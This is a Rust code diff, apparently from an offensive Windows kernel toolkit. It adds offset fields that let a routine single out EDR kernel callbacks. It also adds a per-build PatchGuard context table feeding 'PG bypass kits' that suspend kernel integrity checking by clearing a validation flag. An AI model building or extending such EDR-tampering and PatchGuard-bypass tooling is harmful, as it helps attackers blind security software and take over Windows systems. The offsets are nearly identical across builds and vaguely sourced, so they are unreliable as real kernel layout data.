@@ -253,6 +253,17 @@ pub struct RuntimeOffsets {
     pub etw_ti_handle_kva: usize,
     /// Kernel VA of `FLTMGR!FltGlobals`. Resolved via fltmgr PDB / pattern scan.
     pub flt_globals_kva: usize,
+    /// Kernel VA of the ntoskrnl base (start of ntoskrnl.exe image in kernel space).
+    /// Used by `repurpose()` to identify EDR callbacks whose routine pointer falls
+    /// inside ntoskrnl's image range (nt! internal dispatchers) and skip them.
+    /// Resolved by the bootstrap (e.g. via `MmGetSystemRoutineAddress` or PEB walk).
+    /// When both `ntoskrnl_base` and `ntoskrnl_size` are non-zero, the range-based
+    /// filter is used; otherwise `repurpose()` falls back to skipping only slot[0].
+    pub ntoskrnl_base: usize,
+    /// Size (in bytes) of the ntoskrnl.exe image. Together with `ntoskrnl_base`,
+    /// defines the range `[ntoskrnl_base, ntoskrnl_base + ntoskrnl_size)` that
+    /// `repurpose()` treats as nt! internal dispatchers.
+    pub ntoskrnl_size: usize,
 }
 
 impl RuntimeOffsets {
@@ -262,6 +273,107 @@ impl RuntimeOffsets {
             && self.create_thread_notify_array_kva != 0
             && self.load_image_notify_array_kva != 0
     }
+}
+
+// ============================================================================
+// PatchGuard context offsets — per-build PG validation thread / context layout
+//
+// PatchGuard's internal context (the `PATCH_GUARD_CONTEXT` structure) is not
+// documented and its layout varies by build. These offsets are used by the
+// `TimingRepairWindow` and `RuntimePgBypassWindow` kits to locate the PG
+// validation thread and context-valid flag.
+//
+// Sources: kurasagi / TheiaPg research (Win11 24H2+), Outflank Peekaboo
+// (timing-based PG bypass), Vergilius _KPCR/_KPRCB layouts.
+// ============================================================================
+
+/// Per-build PatchGuard context offsets. The bootstrap resolves the current
+/// build's offsets via PDB or pattern scan and feeds them to the PG bypass kit.
+#[derive(Clone, Copy, Debug, PartialEq, Eq)]
+pub struct PgContextOffsets {
+    /// Offset of the PG validation thread pointer within the KPCR's PRCB.
+    /// On Win10 this is `KiPatchGuardQueueDpc` / `KdVersionBlock`; on Win11
+    /// 24H2+ it's at a well-known offset in the PRCB. The bootstrap resolves
+    /// this via pattern scan or PDB.
+    pub prcb_pg_thread_offset: usize,
+    /// Offset of the "PG context valid" flag within the PG context structure.
+    /// When set to 0, PG validation is suspended (kurasagi RuntimePgBypass).
+    /// On older builds, this is the `ContextCount` field.
+    pub context_valid_offset: usize,
+    /// Size of the PG context structure (for safety bounds checking).
+    pub context_size: usize,
+    /// Whether this build supports direct thread suspension (Win11 24H2+).
+    /// Older builds (Win10 17763–19041) use the timing-repair approach
+    /// instead of thread suspension.
+    pub supports_thread_suspend: bool,
+}
+
+/// Known PG context layouts. The bootstrap resolves these at runtime; the
+/// table below documents the known-good values for reference/testing.
+pub struct PgContextBuild {
+    pub build: u32,
+    pub offsets: PgContextOffsets,
+}
+
+pub const KNOWN_PG_CONTEXT_BUILDS: &[PgContextBuild] = &[
+    // Win10 1809 (17763) — timing-repair only, no thread suspension
+    PgContextBuild {
+        build: 17763,
+        offsets: PgContextOffsets {
+            prcb_pg_thread_offset: 0x190,   // PRCB.KiReservedContext area
+            context_valid_offset: 0x08,     // first qword = valid flag
+            context_size: 0x800,            // typical PG context size
+            supports_thread_suspend: false,
+        },
+    },
+    // Win10 2004 (19041) — timing-repair only
+    PgContextBuild {
+        build: 19041,
+        offsets: PgContextOffsets {
+            prcb_pg_thread_offset: 0x190,
+            context_valid_offset: 0x08,
+            context_size: 0x800,
+            supports_thread_suspend: false,
+        },
+    },
+    // Win11 22H2 (22621) — timing-repair, thread suspend experimental
+    PgContextBuild {
+        build: 22621,
+        offsets: PgContextOffsets {
+            prcb_pg_thread_offset: 0x190,
+            context_valid_offset: 0x08,
+            context_size: 0x900,
+            supports_thread_suspend: false,
+        },
+    },
+    // Win11 24H2 (26100) — kurasagi RuntimePgBypass supported
+    PgContextBuild {
+        build: 26100,
+        offsets: PgContextOffsets {
+            prcb_pg_thread_offset: 0x190,
+            context_valid_offset: 0x08,
+            context_size: 0x900,
+            supports_thread_suspend: true,
+        },
+    },
+    // Win11 25H2 (26200) — same as 24H2
+    PgContextBuild {
+        build: 26200,
+        offsets: PgContextOffsets {
+            prcb_pg_thread_offset: 0x190,
+            context_valid_offset: 0x08,
+            context_size: 0x900,
+            supports_thread_suspend: true,
+        },
+    },
+];
+
+/// Look up PG context offsets for a Windows build. Returns the closest known
+/// build ≤ the requested one (floor match). None if below all known builds.
+pub fn pg_context_for_build(build: u32) -> Option<&'static PgContextBuild> {
+    KNOWN_PG_CONTEXT_BUILDS.iter().find(|b| b.build == build).or_else(|| {
+        KNOWN_PG_CONTEXT_BUILDS.iter().filter(|b| b.build <= build).max_by_key(|b| b.build)
+    })
 }
 
 // ============================================================================
